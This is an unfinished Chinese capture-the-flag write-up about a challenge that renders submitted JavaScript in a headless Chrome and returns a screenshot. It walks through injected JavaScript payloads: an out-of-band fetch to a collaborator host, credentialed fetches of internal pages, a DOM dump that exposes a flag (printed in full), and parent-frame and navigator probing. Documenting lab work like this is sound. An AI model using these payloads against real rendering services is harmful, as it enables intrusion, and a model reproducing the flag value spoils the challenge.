浏览器漏洞，待回顾二进制主题时。或许之后仅查看 cve 稍微探索

## 侦察与探测

访问首页
- 响应
    ```html
    <h1>
        Script
    </h1>
    <form action="saveScript" method="POST">
        <textarea name="script" rows="10" cols="60">
            document.write('Hello from JS');
        </textarea>
        <br>
        <input type="submit" value="Save">
    </form>
    <h1>
        Rendered
    </h1>
    <img src="image">

    ```
    - 端点 `/saveScript`
        - 参数 `script = JS脚本`
    - 似乎为反射资源的 image
        - 当前字符串为 `Hello from JS`

- 提交测试表单
    ```http
    POST /saveScript HTTP/2

    script=document.write('<h2>foo</h2>bar');
    ```
    - 查看反射图片
        - 的确作为 h2 标题与普通文本回显

尝试回显有趣内容
- cookie
    ```js
    document.write(document.cookie);
    ```
    - 无

- 带外
    ```js
    fetch('https://id.oastify.com');
    ```
    - 协作服务器收到 DNS 连接，无 HTTP 请求

- location
    ```js
    script=<@urlencode>

    const test_list = [
        '<pre>',
        location,
        '</pre>'
    ];
    const test_str = test_list.join('\n');
    document.write(test_str);

    </@urlencode>
    ```
    - 显示为 http localhost

- 探测到不存在
    - import
        - 无模块导入
    - process
        - 非 node js

- 分析
    - document 似乎为浏览器
    - location 为 localhost
    - 挑战分类的 `Native` 似乎表示仅使用内置对象
    - fetch 探测可执行网络请求
    - 尝试获取内网响应后设置到图片带外

获取内网响应后设置到图片带外
- 设置 fetch 代码
    ```js
    script=<@urlencode>

    fetch('/', {credentials: 'include'})
        .then(response => response.text())
        .then(text => {
            document.write(text);
        })

    </@urlencode>
    ```
    - 回显主页，方向正确

- 获取头部
    ```js
    script=<@urlencode>

    fetch('/', {credentials: 'include'})
        .then(response => {
            document.write('<hr><pre>');

            const res_headers = [];
            res_headers.push(`${response.status} ${response.statusText}`);
            for (const [key, value] of response.headers.entries()) {
                res_headers.push(`${key}: ${value}`);
            };
            document.write(res_headers.join('\n'));

            document.write('</pre><hr>');

            return response.text();
        })
        .then(text => {
            document.write(text);
        })

    </@urlencode>
    ```
    - 提取图片文字
        ```log
        200 OK
        cache-control: public, max-age=0
        connection: keep-alive
        content-length: 793
        content-type: text/html; charset=utf-8
        date: Mon, 14 Sep 2026 01:03:12 GMT
        expires: 0
        pragma: no-cache
        server: nginx/1.23.2

        Script

        fetch('/', {credentials: 'include'})
            .then(response => {
                document.write('<hr><pre>');

                const res_headers = []
                res_headers.push(` ${response.status}
        ${response.statusText}`);
                for (const [key, value] of
        response.headers.entries()) {

        Save

        Rendered
        ```
    - 似乎模拟浏览器，提取快照 png 后作为 rendered 返回

- 修改渲染内容，从 HTML 到字符
    ```js
    script=<@urlencode>

    function set_hr(){
        const hr = document.createElement('hr');
        document.body.appendChild(hr); 
    }

    function set_pre(text){
        const pre = document.createElement('pre');
        pre.textContent = text;  
        document.body.appendChild(pre);   
    }

    fetch('/', {credentials: 'include'})
        .then(response => {

            set_hr();

            const res_headers = [];
            res_headers.push(`${response.status} ${response.statusText}`);
            for (const [key, value] of response.headers.entries()) {
                res_headers.push(`${key}: ${value}`);
            };
            set_pre(res_headers.join('\n'));

            return response.text();
        })
        .then(text => {
            set_hr();
            set_pre(text);
        })

    </@urlencode>
    ```
    - 返回的渲染图片拥有滚动条，仅显示部分代码

- 暴破 URL
    ```js
    fetch('/§§')
    ```

查看 hint
```md
Flag0 
- What do you have access to?
- Look around your sandbox
- Some places are Definitely mOre iMportant than others
```
- 提示 DOM

查看 DOM
- 载荷
    ```js
    script=<@urlencode>

    function set_pre(text){
        const pre = document.createElement('pre');
        pre.textContent = text;  
        document.body.appendChild(pre);   
    }

    function main(){

        const html_content = document.documentElement.outerHTML;
        set_pre(html_content);

    }

    document.addEventListener('DOMContentLoaded', () => {
        set_pre('start\n');
        main();
        set_pre('end\n');
    });

    </@urlencode>
    ```
    - 若直接 `document.body.appendChild(pre);` 出现异常，似乎此时 `body` 元素尚未被加载。
        - 之前似乎由于 fetch 的延迟，恰巧加载完成
        - 此处增加事件监听器，直到文档元素加载完成

- 响应
    ```html
    start

    <html><head><noscript>^FLAG^65034d3c592d044dce4033c8e0c432c63cde580e27d09cb23680a4bc4bf2d503$FLAG$<
    <script>


    function set_pre(text){
        const pre = document.createElement('pre');
        pre.textContent = text;
        document.body.appendChild(pre);
    }

    function main(){
        const html_content = document.documentElement.outerHTML;
        set_pre(html_content);
    }

    document.addEventListener('DOMContentLoaded', () => {
        set_pre('start\n');
        main();
        set_pre('end\n');
    });

    </script></head><body><pre>start
    </pre></body></html>

    end
    ```
    - 得到 flag 0


查看 hint
```md
Flag1
- The rendered page looks a bit odd
- Can you look outside your iframe?
- There might be something in the body or URL of the parent page

Flag2
- You need RCE here. No other way to put it!
```
- 当前作为子框架
- 查看父框架

探测框架内容
- 载荷
    ```js
    const res = window == window.parent;
    set_pre(res);
    ```
    - 响应 `false`
    - 存在父框架

- 查看父框架

    ```js
    set_pre(`cur_location: ${window.location}`);

    const parent_window = window.parent;

    try {
        const parent_location = parent_window.location; 
        set_pre(`parent_location: ${parent_location}`);
    } catch (error) {
        set_pre(`ERROR parent_location: \n${error.name}\n${error.message}`);
    }
    ```
    - 响应
        ```log
        start

        cur_location: http://localhost/f37c09551527e414ecbbab3a213e1f73

        ERROR parent_location:
        SecurityError
        Blocked a frame with origin "http://localhost" from accessing a cross-origin frame.

        end
        ```
        - 同源策略阻止跨源访问

- 额外：
    - 在子框架中尝试访问当前路径
        ```js
        fetch('/f37c09551527e414ecbbab3a213e1f73'
        ```
        - 响应包含 flag 0
            - 之前尝试访问根目录，得到的并非当前子框架的 HTML，而是移除 flag 
    - 在浏览器中访问此路径
        - 请求
            ```http
            GET /f37c09551527e414ecbbab3a213e1f73 HTTP/2
            ```
        - 响应

            ```html
            HTTP/2 200 OK
            Content-Type: text/html; charset=utf-8

            <noscript>^FLAG^65034d3c592d044dce4033c8e0c432c63cde580e27d09cb23680a4bc4bf2d503$FLAG$</noscript>
            <script>
                ...
            </script>
            ```
            - `script` 标签内，即为提交参数的内容

        - 分析：
            - 当前路径访问不限于服务器端子框架的 localhost
            - 当前端点为被父框架加载的 script 文件
            - 端点字符串序列非 md5 hash


继续侦察
- 打印 `navigator` 
    ```js
    script=<@urlencode>

    function set_pre(text) {
        const pre = document.createElement('pre');
        pre.textContent = text;
        document.body.appendChild(pre);
    }

    function do_slice(text) {
        const set_size = 77;
        const text_length = text.length;
        const ret_list = [];
        for (let i = 0; i < text_length; i += set_size) {
            ret_list.push(text.slice(i, i + set_size));
        }
        return ret_list.join('\n\t');
    }

    function main() {

        const features = [];

        for (const key in navigator) {
            let val = navigator[key];
            if (typeof val === 'string') {
                val = do_slice(val);
            }
            features.push(`${key}: ${val}`);
        }

        set_pre(features.join('\n'));

    }

    document.addEventListener('DOMContentLoaded', () => {
        set_pre('start\n');
        main();
        set_pre('end\n');
    });

    </@urlencode>
    ```
    - 响应
        ```log
        start

        vendorSub: 
        productSub: 20030107
        vendor: Google Inc.
        maxTouchPoints: 0
        hardwareConcurrency: 2
        cookieEnabled: true
        appCodeName: Mozilla
        appName: Netscape
        appVersion: 5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome
            /67.0.3396.79 Safari/537.36
        platform: Linux x86_64
        product: Gecko
        userAgent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Headle
            ssChrome/67.0.3396.79 Safari/537.36
        language: en-US
        languages: en-US
        onLine: true
        doNotTrack: null
        geolocation: [object Geolocation]
        mediaDevices: [object MediaDevices]
        connection: [object NetworkInformation]
        plugins: [object PluginArray]
        mimeTypes: [object MimeTypeArray]
        webkitTemporaryStorage: [object DeprecatedStorageQuota]
        webkitPersistentStorage: [object DeprecatedStorageQuota]
        serviceWorker: [object ServiceWorkerContainer]
        getBattery: function getBattery() { [native code] }
        sendBeacon: function sendBeacon() { [native code] }
        getGamepads: function getGamepads() { [native code] }
        getUserMedia: function getUserMedia() { [native code] }
        webkitGetUserMedia: function webkitGetUserMedia() { [native code] }
        javaEnabled: function javaEnabled() { [native code] }
        vibrate: function vibrate() { [native code] }
        requestMIDIAccess: function requestMIDIAccess() { [native code] }
        webdriver: true
        budget: [object BudgetService]
        permissions: [object Permissions]
        presentation: [object Presentation]
        registerProtocolHandler: function registerProtocolHandler() { [native code] }
        unregisterProtocolHandler: function unregisterProtocolHandler() { [native code] }
        mediaCapabilities: [object MediaCapabilities]

        end
        ```

## 功能端点

`/`
- 功能
    - 返回 `/saveScript` 表单
- 测试
    - [x] 根目录暴破
        - 无

`/saveScript`
- 功能
    - POST 保存 JS 脚本，之后反射到 `/image`
- 参数
    - `script=JS代码`

`/image`
- 功能
    - 作为图片，反射 `/saveScript` 表单中 JS 脚本执行结果
        
`/f37c09551527e414ecbbab3a213e1f73`
- 功能
    - 在 `script` 标签内，保存 `/saveScript` 端点提交的 JS 代码
    - 被父框架加载为子框架

## 错误信息

## 文件